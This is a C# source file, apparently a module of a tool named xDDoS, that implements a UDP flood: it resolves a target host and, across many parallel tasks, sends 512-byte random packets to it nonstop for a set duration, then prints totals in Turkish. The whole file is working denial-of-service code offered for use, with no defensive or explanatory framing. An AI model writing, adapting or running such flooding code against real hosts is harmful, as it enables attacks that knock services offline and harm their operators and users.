using System;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;
using System.Linq;
using Spectre.Console;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.Collections.Concurrent;

namespace xDDoS.Modules
{
    public class UdpFlood
    {
        public static async Task Run(string host, int port, int durationSeconds, int parallelism)
        {
            var cts = new CancellationTokenSource();
            cts.CancelAfter(TimeSpan.FromSeconds(durationSeconds));
            int total = 0, success = 0, fail = 0;
            var endpoint = new IPEndPoint(Dns.GetHostAddresses(host)[0], port);
            byte[] data = new byte[512];

            List<Task> tasks = new List<Task>();
            for (int i = 0; i < parallelism; i++)
            {
                tasks.Add(Task.Run(async () =>
                {
                    using var udp = new UdpClient();
                    var rand = new Random();
                    while (!cts.IsCancellationRequested)
                    {
                        rand.NextBytes(data);
                        try
                        {
                            await udp.SendAsync(data, data.Length, endpoint);
                            Interlocked.Increment(ref total);
                            Interlocked.Increment(ref success);
                        }
                        catch
                        {
                            Interlocked.Increment(ref fail);
                        }
                    }
                }));
            }

            await Task.WhenAll(tasks);

            Console.WriteLine($"[UDP] Toplam: {total}, Başarılı: {success}, Hatalı: {fail}");
        }
    }
} 